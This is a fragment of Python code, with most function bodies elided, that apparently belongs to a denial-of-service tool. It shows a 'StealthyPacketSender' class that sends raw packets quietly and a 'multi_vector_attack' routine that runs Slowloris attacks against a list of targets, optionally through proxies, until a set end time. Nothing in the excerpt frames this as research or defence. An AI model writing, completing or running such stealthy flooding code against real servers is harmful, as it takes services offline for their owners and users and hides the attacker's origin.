...
class StealthyPacketSender:
    ...
    async def send_packet(self, pkt):
        ...
        await asyncio.get_event_loop().run_in_executor(None, lambda: send(pkt, verbose=False))  # Disable verbose
        self.sent_packets += 1
...
async def multi_vector_attack(cfg):
    ...
    async def slowloris_attack(target, proxies=None, end_time=end_time):  # Pass end_time
    ...
    for target in cfg.targets:
        ...
        tasks.append(slowloris_attack(target, cfg.proxies, end_time))  # Pass proxies and end_time
